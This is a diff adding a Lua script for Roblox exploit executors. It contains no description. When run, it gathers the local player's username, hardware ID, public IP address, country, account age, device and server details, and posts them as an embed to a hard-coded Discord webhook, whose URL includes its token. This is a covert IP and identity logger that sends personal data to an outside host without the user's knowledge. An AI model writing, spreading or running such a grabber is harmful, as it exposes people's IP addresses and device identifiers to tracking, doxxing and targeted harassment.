@@ -1,0 +1,115 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+
+local req = (syn and syn.request) or (http and http.request) or (request)
+
+function SendMessage(url, message)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["content"] = message
+    }
+    local body = HttpService:JSONEncode(data)
+    req({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+function SendMessageEMBED(url, embed)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["description"] = embed.description,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+                ["footer"] = {
+                    ["text"] = embed.footer.text
+                }
+            }
+        }
+    }
+    local body = HttpService:JSONEncode(data)
+    req({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+local url = "https://discord.com/api/webhooks/1314842182204657674/PH2qbxqUT52MknjUerWGat8iNWhaH9_jS9xrAX7tgr5WG7klxtlAy389tMvoqrr1uRcw"
+
+local function detectDevice()
+    if UserInputService.TouchEnabled then
+        local platform = UserInputService:GetPlatform()
+        if platform == Enum.Platform.IOS then
+            return "iOS"
+        elseif platform == Enum.Platform.Android then
+            return "Android"
+        else
+            return "Mobile (Unknown)"
+        end
+    elseif UserInputService.KeyboardEnabled then
+        return "PC"
+    else
+        return "Unknown"
+    end
+end
+
+local success, hwid = pcall(function()
+    return game:GetService("RbxAnalyticsService"):GetClientId()
+end)
+
+local success2, ip = pcall(function()
+    return game:HttpGet("https://api.ipify.org")
+end)
+
+local countryInfo = {}
+local success3, result = pcall(function()
+    return game:HttpGet("https://ipwho.is/")
+end)
+if success3 then
+    countryInfo = HttpService:JSONDecode(result)
+end
+
+local flag = countryInfo.flag and countryInfo.flag.emoji or ""
+local country = countryInfo.country or ""
+local executor = identifyexecutor and identifyexecutor() or {"Unknown", ""}
+local device = detectDevice()
+local jobId = game.JobId
+local placeLink = "https://www.roblox.com/games/" .. game.PlaceId
+local accAge = player.AccountAge .. " days"
+local playerCount = #Players:GetPlayers() .. "/" .. Players.MaxPlayers
+
+local embed = {
+    ["title"] = "Player Information",
+    ["description"] = "",
+    ["color"] = 65280,
+    ["fields"] = {
+        { ["name"] = "Name", ["value"] = player.Name },
+        { ["name"] = "HWID", ["value"] = hwid or "Unknown" },
+        { ["name"] = "IP", ["value"] = ip or "Unknown" },
+        { ["name"] = "Country", ["value"] = flag .. " " .. country },
+        { ["name"] = "Account Age", ["value"] = accAge },
+        { ["name"] = "Executor", ["value"] = executor[1] .. (executor[2] ~= "" and " (" .. executor[2] .. ")" or "") },
+        { ["name"] = "Device", ["value"] = device },
+        { ["name"] = "Server ID", ["value"] = jobId },
+        { ["name"] = "Map Link", ["value"] = placeLink },
+        { ["name"] = "Player Count", ["value"] = playerCount },
+    },
+    ["footer"] = {
+        ["text"] = "By general"
+    }
+}
+
+SendMessageEMBED(url, embed)
